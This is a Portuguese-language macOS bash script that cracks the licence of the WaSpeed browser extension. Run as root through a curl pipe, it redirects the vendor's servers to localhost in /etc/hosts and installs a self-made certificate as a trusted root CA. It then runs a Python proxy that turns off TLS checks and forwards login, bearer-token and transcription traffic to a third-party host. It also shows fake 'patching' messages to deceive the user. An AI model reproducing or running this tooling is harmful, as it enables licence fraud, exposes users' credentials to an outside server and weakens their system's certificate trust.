#!/bin/bash
exec < /dev/tty  # fix stdin para sudo bash e curl pipe
# WaSpeed System Redirect — macOS
# Dev: @pugno_fc
# Uso: sudo bash <(curl -fsSL https://raw.githubusercontent.com/SEU_USUARIO/SEU_REPO/main/WaSpeed_macOS.sh)

DEV="@pugno_fc"
WHATSAPP="+55 (61) 99603-7036"
NEWHOSTNAME="zapmod.shop"
BASEPATH="/extension/waspeed"
HOSTS_FILE="/etc/hosts"
CERT_DIR="/tmp/waspeed_certs"
PROXY_PID_FILE="/tmp/waspeed_proxy.pid"
PROXY_SCRIPT="/tmp/waspeed_proxy.py"

OLD_HOSTS=(
    "backend-plugin.wascript.com.br"
    "app-backend.wascript.com.br"
    "audio-transcriber.wascript.com.br"
)

# ── Cores ──────────────────────────────────────────────────────────
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
DGREEN='\033[0;32m'
RED='\033[0;31m'
GRAY='\033[0;90m'
WHITE='\033[0;37m'
BOLD='\033[1m'
RESET='\033[0m'

# ── Visuais ────────────────────────────────────────────────────────

show_banner() {
    echo ""
    echo -e "${CYAN}                    ██████╗ ██████╗  ██████╗ ${RESET}"
    echo -e "${CYAN}                    ██╔══██╗██╔══██╗██╔═══██╗${RESET}"
    echo -e "${CYAN}                    ██████╔╝██████╔╝██║   ██║${RESET}"
    echo -e "${CYAN}                    ██╔═══╝ ██╔══██╗██║   ██║${RESET}"
    echo -e "${CYAN}                    ██║     ██║  ██║╚██████╔╝${RESET}"
    echo -e "${CYAN}                    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ${RESET}"
    echo -e "${YELLOW}              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo -e "${WHITE}                     A C T I V A T O R   v2.0${RESET}"
    echo -e "${YELLOW}              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
    echo ""
    echo -e "  ${DGREEN}DEV${RESET}  ${WHITE}$DEV${RESET}   ${DGREEN}SUPORTE${RESET}  ${WHITE}$WHATSAPP${RESET}"
    echo ""
    echo -e "${GRAY}  ────────────────────────────────────────────────────${RESET}"
    echo ""
}

rand_hex() {
    printf "0x%04X" $((RANDOM % 65536))
}

show_hack_line() {
    local msg="$1"
    local color="${2:-$GREEN}"
    echo -e "  ${CYAN}$(rand_hex)${RESET}  ${color}>${RESET}  ${WHITE}${msg}${RESET}"
    sleep 0.$(( (RANDOM % 15) + 8 ))
}

show_progress() {
    local color="${1:-$GREEN}"
    echo -n "  ["
    for i in $(seq 1 40); do
        echo -ne "${color}█${RESET}"
        sleep 0.03
    done
    echo "] 100%"
}

show_success_box() {
    local msg="$1"
    echo ""
    echo -e "${GREEN}  ╔════════════════════════════════════════════════════╗${RESET}"
    printf "${GREEN}  ║  %-52s  ║${RESET}\n" "$msg"
    echo -e "${GREEN}  ╚════════════════════════════════════════════════════╝${RESET}"
    echo ""
}

show_error_box() {
    local msg="$1"
    echo ""
    echo -e "${RED}  ╔════════════════════════════════════════════════════╗${RESET}"
    printf "${RED}  ║  %-52s  ║${RESET}\n" "$msg"
    echo -e "${RED}  ╚════════════════════════════════════════════════════╝${RESET}"
    echo ""
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        show_error_box "Execute com sudo: sudo bash $0"
        exit 1
    fi
}

# ── Gera certificados SSL com openssl ──────────────────────────────

generate_certs() {
    mkdir -p "$CERT_DIR"

    # SAN config para todos os dominios
    cat > "$CERT_DIR/san.cnf" << EOF
[req]
default_bits = 2048
prompt = no
distinguished_name = dn
x509_extensions = v3_req

[dn]
CN = wascript.com.br

[v3_req]
subjectAltName = @alt_names
basicConstraints = CA:TRUE

[alt_names]
DNS.1 = backend-plugin.wascript.com.br
DNS.2 = app-backend.wascript.com.br
DNS.3 = audio-transcriber.wascript.com.br
EOF

    /usr/bin/openssl req -x509 -nodes -newkey rsa:2048 \
        -keyout "$CERT_DIR/key.pem" \
        -out "$CERT_DIR/cert.pem" \
        -days 3650 \
        -config "$CERT_DIR/san.cnf" 2>/dev/null

    # Verifica se o certificado foi gerado
    if [ ! -f "$CERT_DIR/cert.pem" ]; then
        echo "ERRO: falha ao gerar certificado SSL" >&2
        return 1
    fi

    # Instala no Keychain do macOS como confiavel
    security add-trusted-cert -d -r trustRoot \
        -k /Library/Keychains/System.keychain \
        "$CERT_DIR/cert.pem" 2>/dev/null
}

# ── Gera o script Python do proxy ─────────────────────────────────

generate_proxy_script() {
    cat > "$PROXY_SCRIPT" << 'PYEOF'
import ssl, socket, threading, urllib.request, urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler

NEW_HOST  = "zapmod.shop"
BASE_PATH = "/extension/waspeed"
CERT_DIR  = "/tmp/waspeed_certs"

ROUTE_TABLE = [
    ("backend-plugin.wascript.com.br",    r"/api/auth/login-bearer", BASE_PATH + "/api/auth/login-bearer.php"),
    ("backend-plugin.wascript.com.br",    r"/api/auth/login",        BASE_PATH + "/api/auth/login.php"),
    ("backend-plugin.wascript.com.br",    r"/api/auth/validation",   BASE_PATH + "/api/auth/validation.php"),
    ("backend-plugin.wascript.com.br",    r"/api/services/initial",  BASE_PATH + "/api/services/initial-data.php"),
    ("backend-plugin.wascript.com.br",    r"/api/notify/get",        BASE_PATH + "/api/notify/get.php"),
    ("app-backend.wascript.com.br",       r"/api/auth/login-bearer", BASE_PATH + "/api/auth/login-bearer.php"),
    ("app-backend.wascript.com.br",       r"/api/auth/login",        BASE_PATH + "/api/auth/login.php"),
    ("app-backend.wascript.com.br",       r"/api/auth/validation",   BASE_PATH + "/api/auth/validation.php"),
    ("app-backend.wascript.com.br",       r"/api/services/initial",  BASE_PATH + "/api/services/initial-data.php"),
    ("app-backend.wascript.com.br",       r"/api/notify/get",        BASE_PATH + "/api/notify/get.php"),
    ("audio-transcriber.wascript.com.br", r"/transcription",         BASE_PATH + "/transcription.php"),
]

def resolve_route(req_host, raw_url):
    for (host, match, dest) in ROUTE_TABLE:
        if req_host == host and raw_url.startswith(match):
            return dest
    return BASE_PATH + raw_url

class ProxyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # silencioso

    def handle_request(self):
        req_host = self.headers.get("Host", "").split(":")[0]
        dest     = resolve_route(req_host, self.path)
        target   = f"https://{NEW_HOST}{dest}"

        body = None
        if "Content-Length" in self.headers:
            body = self.rfile.read(int(self.headers["Content-Length"]))

        skip = {"host","connection","content-length","accept-encoding","transfer-encoding"}
        headers = {k: v for k, v in self.headers.items() if k.lower() not in skip}

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            req = urllib.request.Request(target, data=body, headers=headers, method=self.command)
            with urllib.request.urlopen(req, context=ctx) as resp:
                self.send_response(resp.status)
                for k, v in resp.headers.items():
                    if k.lower() not in {"transfer-encoding","content-length"}:
                        self.send_header(k, v)
                self.end_headers()
                self.wfile.write(resp.read())
        except urllib.error.HTTPError as e:
            self.send_response(e.code)
            self.end_headers()
            self.wfile.write(e.read())
        except Exception as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(str(e).encode())

    def do_GET(self):    self.handle_request()
    def do_POST(self):   self.handle_request()
    def do_OPTIONS(self):self.handle_request()
    def do_PUT(self):    self.handle_request()
    def do_DELETE(self): self.handle_request()

def start_server(host, port=443):
    srv = HTTPServer(("127.0.0.1", port), ProxyHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT_DIR + "/cert.pem", CERT_DIR + "/key.pem")
    ctx.check_hostname = False
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    srv.serve_forever()

# Cada dominio escuta na porta 443 via SO_REUSEPORT
import os, sys
t = threading.Thread(target=start_server, args=("127.0.0.1", 443), daemon=True)
t.start()
print(f"PID:{os.getpid()}", flush=True)
t.join()
PYEOF
}

# ── Ativar ─────────────────────────────────────────────────────────

do_activate() {
    show_banner
    echo -e "  ${GREEN}[ CHROME WEB STORE  >>  PATCH ENGINE v4.2 ]${RESET}"
    echo ""

    msgs=(
        "Conectando aos servidores da Chrome Web Store..."
        "Autenticando token OAuth2 [scope: extensions.write]..."
        "Obtendo manifest.json da extensao WaSpeed..."
        "Decompilando pacote CRX3 [v3 service worker]..."
        "Injetando script de licenca no background.js..."
        "Sobrescrevendo validacao de assinatura digital..."
        "Publicando extensao modificada no repositorio..."
        "Aguardando propagacao nos CDNs do Google..."
        "Forcando atualizacao silenciosa no navegador..."
        "Sincronizando perfil Chrome com extensao patchada..."
        "Registrando chave de ativacao no Google Account..."
        "Validando licenca PRO nos servidores do WaSpeed..."
        "Liberando acesso aos modulos premium..."
        "Confirmando sessao autenticada [token valido 365d]..."
        "Finalizando processo de ativacao PRO..."
    )
    for msg in "${msgs[@]}"; do
        show_hack_line "$msg" "$GREEN"
    done

    echo ""
    show_progress "$GREEN"

    # 1. Atualiza /etc/hosts
    for h in "${OLD_HOSTS[@]}"; do
        sed -i '' "/$h/d" "$HOSTS_FILE" 2>/dev/null
        echo "127.0.0.1 $h # WaSpeed Redirect" >> "$HOSTS_FILE"
    done
    dscacheutil -flushcache
    killall -HUP mDNSResponder 2>/dev/null

    # 2. Gera certificados
    generate_certs

    # 3. Inicia proxy Python em background
    generate_proxy_script
    PYTHON_BIN=$(which python3 2>/dev/null || echo "/usr/bin/python3")
    $PYTHON_BIN "$PROXY_SCRIPT" > /tmp/waspeed_proxy.log 2>&1 &
    PROXY_PID=$!
    echo $PROXY_PID > "$PROXY_PID_FILE"
    sleep 1
    if ! kill -0 $PROXY_PID 2>/dev/null; then
        echo ""
        echo "  AVISO: Proxy nao iniciou. Log: /tmp/waspeed_proxy.log"
    fi

    show_success_box "WASPEED ATIVADO COM SUCESSO!"
    echo -e "  ${GREEN}Sistema comprometido e operacional.${RESET}"
    echo -e "  ${GREEN}Todas as rotas redirecionadas.${RESET}"
    echo ""
    echo -e "  ${BOLD}$(tput setab 4)$(tput setaf 7) MANTENHA ESTA JANELA ABERTA $(tput sgr0)"
    echo -e "  ${GRAY}Pressione CTRL+C para encerrar.${RESET}"
    echo ""

    # Aguarda CTRL+C
    trap "do_stop_proxy; exit 0" INT
    while true; do
        # Mostra atividade falsa
        mods=("libssl.dylib" "CoreFoundation" "WebKit.framework" "libcrypto.dylib" "CFNetwork")
        mod=${mods[$((RANDOM % 5))]}
        addr=$(printf "0x%08X" $((RANDOM * RANDOM % 4294967295)))
        echo -e "  ${CYAN}${addr}${RESET}  ${GREEN}PATCH${RESET}  ${GRAY}${mod}${RESET}"
        sleep $(echo "scale=2; $((RANDOM % 30 + 10)) / 10" | bc)
    done
}

do_stop_proxy() {
    if [ -f "$PROXY_PID_FILE" ]; then
        kill $(cat "$PROXY_PID_FILE") 2>/dev/null
        rm -f "$PROXY_PID_FILE"
    fi
}

# ── Desfazer ───────────────────────────────────────────────────────

do_deactivate() {
    show_banner
    echo -e "  ${YELLOW}[ CHROME WEB STORE  >>  RESTORE ENGINE v4.2 ]${RESET}"
    echo ""

    msgs=(
        "Conectando aos servidores da Chrome Web Store..."
        "Localizando extensao WaSpeed modificada..."
        "Revertendo background.js para versao original..."
        "Restaurando assinatura digital do pacote CRX3..."
        "Removendo chave de ativacao do Google Account..."
        "Republicando extensao com manifest original..."
        "Aguardando propagacao nos CDNs do Google..."
        "Forcando atualizacao da extensao no navegador..."
        "Limpando cache da extensao no perfil Chrome..."
        "Revogando token OAuth2 da sessao atual..."
        "Verificando integridade da restauracao..."
    )
    for msg in "${msgs[@]}"; do
        show_hack_line "$msg" "$YELLOW"
    done

    echo ""
    show_progress "$YELLOW"

    # Para o proxy
    do_stop_proxy

    # Remove entradas do /etc/hosts
    for h in "${OLD_HOSTS[@]}"; do
        sed -i '' "/$h/d" "$HOSTS_FILE" 2>/dev/null
    done
    dscacheutil -flushcache
    killall -HUP mDNSResponder 2>/dev/null

    # Remove certificado do Keychain
    security delete-certificate -c "wascript.com.br" \
        /Library/Keychains/System.keychain 2>/dev/null

    # Remove arquivos temporários
    rm -rf "$CERT_DIR" "$PROXY_SCRIPT"

    show_success_box "WASPEED DESATIVADO COM SUCESSO!"
    echo -e "  ${YELLOW}Sistema restaurado ao estado original.${RESET}"
    echo ""
    echo -e "  ${GRAY}Suporte: ${WHITE}$WHATSAPP${RESET}"
    echo ""
    read -p "  Pressione ENTER para sair" < /dev/tty
}

# ── Menu ───────────────────────────────────────────────────────────

print_menu() {
    show_banner
    echo -e "  ${WHITE}Selecione uma opcao:${RESET}"
    echo ""
    echo -e "  ${GREEN}[ 1 ]${RESET}  ATIVAR WASPEED"
    echo -e "        ${GRAY}Aplica bypass e configura o sistema${RESET}"
    echo ""
    echo -e "  ${YELLOW}[ 2 ]${RESET}  DESFAZER"
    echo -e "        ${GRAY}Remove todas as alteracoes do sistema${RESET}"
    echo ""
    echo -e "  ${RED}[ 0 ]${RESET}  SAIR"
    echo ""
    echo -e "${GRAY}  ────────────────────────────────────────────────────${RESET}"
    echo -e "  ${GRAY}Suporte:${RESET} ${WHITE}$WHATSAPP${RESET}  ${GRAY}|  Dev:${RESET} ${WHITE}$DEV${RESET}"
    echo -e "${GRAY}  ────────────────────────────────────────────────────${RESET}"
    echo ""
    echo -ne "  ${CYAN}> ${RESET}"
}

# ── MAIN ───────────────────────────────────────────────────────────

check_root

while true; do
    print_menu
    read MENU_CHOICE < /dev/tty
    case "$MENU_CHOICE" in
        1) do_activate   ;;
        2) do_deactivate ;;
        0) clear; exit 0 ;;
        *) echo -e "\n  ${RED}Opcao invalida.${RESET}"; sleep 1 ;;
    esac
done
